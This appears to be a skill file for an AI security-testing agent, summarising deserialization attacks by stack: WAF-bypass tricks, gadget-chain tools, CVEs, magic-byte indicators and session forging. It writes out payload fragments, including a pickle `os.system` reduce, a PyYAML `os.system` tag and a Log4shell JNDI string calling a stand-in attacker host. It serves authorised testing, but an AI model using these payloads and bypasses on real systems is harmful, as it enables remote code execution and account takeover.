---
name: deserialization
description: >-
  Deserialization attacks — PHP/Java/.NET/Ruby/Python/Node object injection, gadget
  chains (ysoserial/phpggc), ViewState/Telerik/DNN, pickle/Marshal/YAML unsafe loads,
  PHAR metadata, JNDI/log4shell, Flight protocol. Auto-invoke when: base64/hex blobs
  with magic bytes (rO0/ACED, AAEAAAD, O:/a:, gAS, BAh, /wEP), serialized cookies
  (__dnnvariable, __VIEWSTATE, jato.pageSession), unserialize-echoing errors, upload
  of .pkl/.ser/.phar/.srf. Do NOT load for: plain JSON/REST → `api`; upload-driven →
  `file_upload`.
family: sink-signal
severity: critical
---

# Deserialization — magic bytes → gadget chains → RCE

> **Arsenal:** RCE on Java/.NET/PHP/Python/Ruby/Node stacks via crafted serialized objects.
> **Sibling:** `file_upload` (payload delivery), `rce` (result), `info_disclosure`
> (gadget hints), `llm_prompt_injection` (agent tool-schema poisoning).
> **Proof bar:** OBSERVABLE effect from the forged object — OOB callback (DNS/HTTP),
> command output, file write, or error containing YOUR data. Magic-byte presence is
> `possible`, not proof.
> **Setup:** identify the serializer from magic bytes, then payload per stack. OAST ready.

## WAF Bypass (deserialization)
- Blob in cookies → try in headers/params/JSON fields (same serializer, different smuggling surface)
- Base64 vs raw vs gzip'd variants (ViewState `%2f`-URL-encoded, then B64; `rO0` sometimes gzip+hex)
- Magic-byte stripping: some gates sniff `rO0` — remove leading bytes, nest, or URL/unicode encode mid-blob
- `.NET` ViewState: `__VIEWSTATE` + `__VIEWSTATEGENERATOR` — MAC validation bypass via `isreadonly` / machineKey-only config hints
- Charset trickery: UTF-16 boxed stream; double-base64 parameters (`base64(base64(payload))`)

## Context
- Anywhere the app stores state in a serialized object it later `load()`s: session cookies, hidden
  fields, cache entries, import files, queue messages, RPC payloads. The bug = `unserialize()`/
  `pickle.loads()`/`ObjectInputStream.readObject()`/`BinaryFormatter` on attacker-influenced data
  + a gadget class on the classpath.

## General Techniques
- **PHP object injection:** `O:<n>:"Class":<n>:{...}` via `unserialize()` on cookie/param; phpggc gadget chains (`RCE1-9`, `SOAP`, `FastDestruct`, `phar://` triggers via file functions)
- **PHAR metadata:** any `file_exists`/`include`/`getimagesize` on attacker path → `phar://payload.phar` triggers unserialize of embedded object (upload polyglot allowed)
- **Java native:** `rO0...` (ACED) in cookie/session/param → ysoserial chain (`CommonsCollections`, `URLDNS` — OAST-only test)
- **Java RMI/JMX:** `JMXInvokerServlet`/`EJBinvokerServlet` unauth deserialize (JBoss) → ysoserial
- **Fastjson:** `@type: com.sun.rowset.JdbcRowSetImpl` jndi gadget; autotype blacklist bypass history
- **.NET ViewState:** tamper without MAC (or captured machineKey) → ysoserial.net `ObjectStateFormatter` (GadgetType=ViewState)
- **DNN:** `__dnnvariable` cookie (CVE-2017-9822 class) → ysoserial.net
- **Telerik:** `Telerik.Web.UI.DialogHandler.aspx` (`rauPostData`) (CVE-2019-18935) — ORIGINAL `Utility_Info` key needed
- **Python pickle:** `__reduce__` returning `(os.system, ('id',))` in pickle.loads sinks/ML model files (`torch.load`)
- **PyYAML unsafe:** `yaml.load` on documents with `!!python/object/apply:os.system`
- **Ruby Marshal:** `BAh` blobs → `Gem::Installer`/`Gem::SpecFetcher` gadgets (v1.7.x era)
- **Node:** `toString`/`valueOf`/`promise-then` magic methods; `eval`-adjacent JSON parsing
- **React Flight protocol:** crafted Flight payloads (CVE-2025-55182/66478) → client RCE
- **JNDI/Log4shell:** `${jndi:ldap://attacker/a}` in any param/header (Java stacks)
- **Generic binary:** Freddy (Burp) blob-fingerprint + gadget scan for unknown serializers
- **Blind bomb:** send URLDNS (Java) / DNS-probe (PHP `_Closure`), watch OAST for callback — fingerprint the sink with zero risk

## Second-Order & Bypass Techniques
- Deserialize-then-cache: payload only triggers when the cached object is materialized (second request)
- Import-processing pipelines: .docx/.xlsx/.php-file with serialized blobs in metadata (zip+XML polyglot → OOXML deserialize)

## Auth Bypass Techniques
- `rocket-mode` session state forged: for a user you never logged in as — object says "admin", app trusts it
- jato.pageSession / DNN cookies carrying the whole auth state — forge role fields

## Header Techniques
- Cookie headers carrying blobs; `X-*` headers feeding queue consumers (message payload in header)
- `Content-Type: application/x-java-serialized-object` endpoints

## CVE on Sight
| CVE | Surface | Class |
|---|---|---|
| CVE-2015-7501 | CommonsCollections 3.x | Java gadget chain RCE (ORIGIN of the era) |
| CVE-2017-9822 | DotNetNuke | __dnnvariable cookie |
| CVE-2019-18935 | Telerik UI | dialog handler deserialize |
| CVE-2025-55182 / 66478 | React Server Components | Flight protocol RCE |
| CVE-2020-8127 | jQuery.uploadFile (PHP) | deserialization RCE |
| CVE-2018-1000001 | glibc realpath | (rare) adjacent |

## Indicators — record as `possible` when seen
- Magic bytes: `rO0AB`/`ACED` (Java) · `AAEAAAD/` ( .NET) · `O:`/`a:`/`Tz` (PHP) · `gAS` (pickle) · `BAh` (Ruby marshal) · `/wEP` (ViewState)
- Cookies: `__dnnvariable`, `__VIEWSTATE`, `jato.pageSession`, `JSESSIONID` variants carrying blobs
- Errors: `StreamCorruptedException`, `InvalidClassException`, `UnpicklingError`, `SerializationException`, `unserialize():`
- Upload accept .pkl/.ser/.bin/.phar/.srf; ML model endpoints; cache/queue consumer surfaces

## Tools
- ysoserial / ysoserial.net / phpggc (YOUR lab/test servers only; OAST-only chains against targets)
- Burp Freddy extension (blob→gadget scan); `pip-audit`/`osv-scanner` for gadget-library versions
- GNU `bbq`/`serialization-stuff` for crafting; interactsh for blind probes
- `curl -s -b "__dnnvariable=<payload>" URL/` — verify OAST, never in-band alone